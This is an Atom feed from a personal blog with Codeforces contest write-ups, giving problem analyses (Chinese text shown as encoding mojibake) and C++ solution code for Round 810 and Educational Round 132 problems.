<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>å­¦ä¹ åº”è¯¥åƒå‘¼å¸ä¸€æ ·è‡ªç„¶</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-24T18:19:54.930Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Codeforces Round 810(Div.2)è§£æ</title>
    <link href="http://example.com/2022/07/25/Codeforces%20Round%20810(Div.2)/"/>
    <id>http://example.com/2022/07/25/Codeforces%20Round%20810(Div.2)/</id>
    <published>2022-07-24T17:00:00.000Z</published>
    <updated>2022-07-24T18:19:54.930Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™åœºæ‰“å›æ¥ä¸€ç‚¹å§ï¼Œåªæ˜¯çœ‹éš”å£div1å¥½åƒè¢«å–·çƒ‚äº†çš„æ ·å­ï¼Œå’±ä¹Ÿä¸æ‡‚ï¼Œä¹Ÿæ²¡èµ„æ ¼æ‰“div1ï¼Œå¾ˆå¤šç»†èŠ‚æ²¡æ³¨æ„åˆ°é€å‡ºå»ç½šæ—¶å°±å¾ˆéš¾å—ï¼Œæœ¬åœºå½•å±åœ¨Bç«™äº†ï¼Œ</p><span id="more"></span><h2 id="A-Perfect-Permutation"><a href="#A-Perfect-Permutation" class="headerlink" title="A. Perfect Permutation"></a>A. Perfect Permutation</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜é¢˜æ„çœ‹äº†æˆ‘æœ‰ç‚¹ä¹…ï¼Œå°±æ˜¯æ„é€ ä¸€ä¸²èƒ½ä½¿å¾— <code>a[i]/i</code> ä¸ºæ•´æ•°æ¯”è¾ƒå°‘çš„åºåˆ—ï¼Œé‚£ä¹ˆ <code>i=1</code> å®ƒå¯ä»¥è¢«ä»»æ„æ•°æ•´é™¤ã€‚ä½†æ˜¯ <code>i&gt;1</code> æˆ‘æ€»èƒ½æ‰¾åˆ°ä¸èƒ½æ•´é™¤çš„æ•°ï¼Œå› æ­¤è¿™é‡Œæ„é€ çš„åºåˆ—å°±æ˜¯ï¼Œç¬¬ä¸€ä¸ªç»™ <code>n</code>ï¼Œåé¢çš„ç»™ <code>i-1</code> å³å¯ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">&#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Party"><a href="#B-Party" class="headerlink" title="B. Party"></a>B. Party</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ï¼Œå‡ºçš„ä¹ŸæŒºå¥½çš„æ„Ÿè§‰ï¼Œè™½ç„¶ä¸€å¼€å§‹å¯èƒ½é¢˜æ„æœ‰ç‚¹æ²¡è¯»æ‡‚ã€‚æœ‰nä¸ªäººï¼Œmå¯¹å…³ç³»ï¼Œå¦‚æœæ¯ä¸ªäººå¦‚æœæ²¡æ¥å°±ä¼šäº§ç”Ÿ $a_i$ çš„ä¸å¼€å¿ƒåº¦ï¼Œå¦‚æœæ¥äº†ä¸€å¯¹æœ‹å‹é‚£è¿™å¯¹æœ‹å‹è¦æ¶ˆè€—ä¸€ä¸ªè›‹ç³•ï¼Œä¸€æ¬¡åªèƒ½ç”Ÿäº§å¶æ•°ä¸ªè›‹ç³•ä¸èƒ½æµªè´¹ã€‚é‚£ä¹ˆå¾ˆæ˜¾ç„¶ï¼Œå¦‚æœå…³ç³»æœ¬èº«å°±æ˜¯å¶æ•°å¯¹ï¼Œé‚£ä¹ˆæ‰€æœ‰äººéƒ½å¯ä»¥æ¥ã€‚å¦‚æœå…³ç³»æ˜¯å¥‡æ•°å¯¹ï¼Œæˆ‘å°±å¾—è€ƒè™‘è¸¢äººäº†ï¼Œè¸¢æ‰ä¸€ä¸ªäººçš„æƒ…å†µï¼Œä½¿å¥‡æ•°å¯¹å˜æˆå¶æ•°å¯¹çš„æ–¹å¼å°±æ˜¯ï¼Œè¿™ä¸ªäººæœ‰å¥‡æ•°å¯¹å…³ç³»ï¼Œé‚£ä¹ˆè¸¢äº†è¿™ä¸ªäººå°±å°‘äº†å¥‡æ•°å¯¹å…³ç³»ï¼Œç»“æœå˜æˆå¶æ•°å¯¹äº†ã€‚è¸¢æ‰ä¸¤ä¸ªäººçš„æƒ…å†µï¼Œå¦‚æœæ‰€æœ‰äººçš„å…³ç³»æ•°éƒ½æ˜¯å¥‡æ•°å¯¹æˆ–è€…æœ¬èº«è¸¢æ‰ä¸¤ä¸ªäººæ¯”è¸¢æ‰ä¸€ä¸ªäººäº§ç”Ÿä¸å¼€å¿ƒæŒ‡æ•°æ›´å¤šï¼Œæˆ‘å°±è¦è€ƒè™‘åé¢çš„æƒ…å†µäº†ã€‚é‚£ä¹ˆæˆ‘å¦‚æœè¦è¸¢æ‰ä¸¤ä¸ªäººï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªäººä¸€å®šéƒ½æœ‰å¶æ•°å¯¹å…³ç³»ï¼Œå› ä¸ºä½†å‡¡æœ‰ä¸€ä¸ªå¥‡æ•°å¯¹å…³ç³»æˆ‘éƒ½å¯ä»¥åªè¸¢æ‰é‚£ä¸ªäººè€Œä¿ç•™ä¸‹æ¥å¦ä¸€ä¸ªï¼Œæ˜¾ç„¶è¿™æ ·çš„ä½œæ³•æ¯”è¾ƒä¼˜ã€‚é‚£ä¹ˆè¸¢æ‰çš„ä¸¤ä¸ªäººéƒ½æ˜¯å¶æ•°å¯¹å…³ç³»æ€ä¹ˆåŠå‘¢ï¼Ÿå¦‚æœå®ƒä»¬è‡ªå·±äº§ç”Ÿäº†ä¸€å¯¹å…³ç³»ï¼Œé‚£ä¹ˆä¸¤ä¸ªäººçš„å¶æ•°å…³ç³»å‘ç”Ÿä¸€ä¸ªå…³ç³»çš„é‡åˆï¼Œæ€»ä½“ä¸‹æ¥å°±æ˜¯å¥‡æ•°å¯¹å…³ç³»äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è¸¢æ‰ä¸¤ä¸ªæœ‹å‹å…³ç³»çš„ï¼Œå¼€å¿ƒæŒ‡æ•°è¾ƒå°çš„ä¸¤ä¸ªäººã€‚</p><p>ç„¶åminä¸€ä¸‹å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;G[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.v&lt;b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].v);</span><br><span class="line">a[i].i=i;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(G[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line"><span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">table[a[i].i]=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">G[table[x]].<span class="built_in">push_back</span>(table[y]);</span><br><span class="line">G[table[y]].<span class="built_in">push_back</span>(table[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">m=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="comment">//printf(&quot;i=%d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d has %d\n&quot;,a[i].i,G[i].size());</span></span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>)&#123;</span><br><span class="line">m=a[i].v;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v&gt;m)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x=G[i].<span class="built_in">begin</span>();x!=G[i].<span class="built_in">end</span>();x++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v+a[*x].v&lt;m)&#123;</span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;G[*x].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">m=a[i].v+a[*x].v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Color-the-Picture"><a href="#C-Color-the-Picture" class="headerlink" title="C. Color the Picture"></a>C. Color the Picture</h2><h2 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜ä¹Ÿè¿˜æŒºå¥½çš„ï¼Œå°±æ˜¯åˆ·æ ¼å­ï¼Œç„¶åè¦æ±‚ä¸€æ¯ä¸ªæ ¼å­å“é“ƒæ ¼å­éƒ½è‡³å°‘æœ‰ä¸‰å—ç›¸åŒè‰²å—ï¼Œé‚£ä¹ˆå°±æ˜¯è¯´ä½ æœ€å¤šåªæœ‰ä¸€ä¸ªä¸åŒè‰²å—çš„ç›¸é‚»ï¼Œå¹¶ä¸”å‘Šè¯‰ä½ äº†æ€ä¹ˆå¤„ç†è¾¹ç•Œçš„è‰²å—ã€‚é‚£ä¹ˆå®ƒä¸‹é¢å±•ç¤ºçš„å›¾å…¶å®è¿˜æ˜¯æ¯”è¾ƒç”ŸåŠ¨çš„ï¼Œå°±æ˜¯åˆ·ä¸¤åˆ—æˆ–è€…ä¸¤è¡Œï¼Œç„¶åå†åˆ·ä¸¤åˆ—ä¸¤åˆ—ï¼Œå¦‚æ­¤å¾€å¤ã€‚å½“ç„¶ï¼Œä¸‰åˆ—å››åˆ—éƒ½å¯ä»¥ï¼Œä¸€åˆ—æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå·¦å³å°±æœ‰ä¸¤ä¸ªä¸åŒé¢œè‰²çš„è‰²å—äº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ¯è¡Œæ¯åˆ—çœ‹çœ‹èƒ½ä¸èƒ½æ”¾çš„å‡ºå¯¹åº”çš„è¡Œæˆ–è€…åˆ—æ•°å³å¯ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦ç‰¹åˆ¤ï¼Œå¦‚æœæˆ‘ä»¬éƒ½åªèƒ½æ”¾ä¸¤åˆ—ï¼Œä½†æ˜¯å´åªæœ‰å¥‡æ•°åˆ—ï¼Œè¿™ç§æƒ…å†µæ˜¯ä¸è¡Œçš„ï¼ï¼</p><p>æœ€åä¸å¼€ <code>long long</code> è§ç¥–å®—ï¼Œä¸‡äº‹ç»™æˆ‘åŠ ä¸Šä¸€å¥<code>#define int long long</code>ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],c[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="comment">//int cmp(int a,int b)&#123;</span></span><br><span class="line"><span class="comment">//return a&lt;b;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">b[i]=a[i]/n;</span><br><span class="line">c[i]=a[i]/m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag1=<span class="number">0</span>,flag2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i]!=<span class="number">2</span>)flag1=<span class="number">1</span>;</span><br><span class="line">ans+=b[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=m)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag1&amp;&amp;m%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(c[i]!=<span class="number">2</span>)flag2=<span class="number">1</span>;</span><br><span class="line">ans+=c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,ans,n);</span></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=n)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag2&amp;&amp;n%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€åè¯´ä¸€å¥å§ï¼Œå°±æ˜¯ç»†èŠ‚é—®é¢˜çœŸçš„è¦è€ƒè™‘å‘¨å…¨ä¸€ç‚¹çš„ï¼Œå°ä¸Šä¸€æ³¢åˆ†ï¼Œä½†æ˜¯ç¦»1600è¿˜æ˜¯å·®è¿œäº†ï¼Œåªèƒ½ç»§ç»­åŠªåŠ›äº†ï¼ŒæœŸå¾…ä¸‹æ¬¡ä¸Šå¤§åˆ†äº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™åœºæ‰“å›æ¥ä¸€ç‚¹å§ï¼Œåªæ˜¯çœ‹éš”å£div1å¥½åƒè¢«å–·çƒ‚äº†çš„æ ·å­ï¼Œå’±ä¹Ÿä¸æ‡‚ï¼Œä¹Ÿæ²¡èµ„æ ¼æ‰“div1ï¼Œå¾ˆå¤šç»†èŠ‚æ²¡æ³¨æ„åˆ°é€å‡ºå»ç½šæ—¶å°±å¾ˆéš¾å—ï¼Œæœ¬åœºå½•å±åœ¨Bç«™äº†ï¼Œ&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Codeforces Round 132(Div.2)åˆ†æ</title>
    <link href="http://example.com/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/"/>
    <id>http://example.com/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/</id>
    <published>2022-07-23T13:00:00.000Z</published>
    <updated>2022-07-23T13:17:33.437Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡çš„æ¯”èµ›æ²¡æ‰“ï¼Œä½†æ˜¯è‡ªå·±æ‰“ä¼°è®¡å°±æ˜¯è‡ªé—­ä¸Šå»çš„ã€‚</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ ä¸‰ä¸ªé—¨ï¼Œæ¯ä¸ªé—¨åå¯èƒ½æœ‰ğŸ”‘ï¼Œä¸€ä¸ªé’¥åŒ™å¼€ä¸€ä¸ªå¯¹åº”çš„é—¨ï¼Œé—®ä½ æ˜¯å¦æœ‰åŠæ³•æŠŠæ‰€æœ‰çš„é—¨æ‰“å¼€ã€‚å¾ˆç®€å•ï¼Œå°±é‚£åˆ°ğŸ”‘å¼€ä¸ªé—¨ï¼Œæ¢æ–°é’¥åŒ™ï¼Œçœ‹çœ‹èƒ½å¼€å‡ ä¸ªé—¨å°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 